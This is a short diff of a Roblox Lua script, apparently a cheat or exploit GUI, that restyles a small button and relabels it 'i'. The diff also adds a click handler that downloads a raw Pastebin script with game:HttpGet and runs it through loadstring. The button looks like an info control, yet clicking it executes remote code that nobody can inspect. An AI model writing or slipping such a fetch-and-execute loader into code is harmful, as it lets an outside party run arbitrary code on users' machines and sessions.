@@ -168,16 +168,21 @@ it.CornerRadius = UDim.new(0.7,0)
 
 local ml = Instance.new("TextButton")
 ml.Parent = Frame1
-ml.Size = UDim2.new(0.1,0,0.2)
+ml.Size = UDim2.new(0.05,0,0.2)
 ml.Position = UDim2.new(0.7,0,0.8)
 ml.BackgroundColor3 = Color3.fromRGB(52,43,117)
 ml.TextSize = 12
+ml.Font = Enum.Font.Code
 ml.TextColor3 = Color3.fromRGB(255,255,255)
-ml.Text = "1"
+ml.Text = "i"
 
 local mll = Instance.new("UICorner")
 mll.Parent = ml
 mll.CornerRadius = UDim.new(1,0)
+
+ml.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/iRVdcnfH"))()
+end)
 
 local bi = Instance.new("TextButton")
 bi.Parent = Frame1
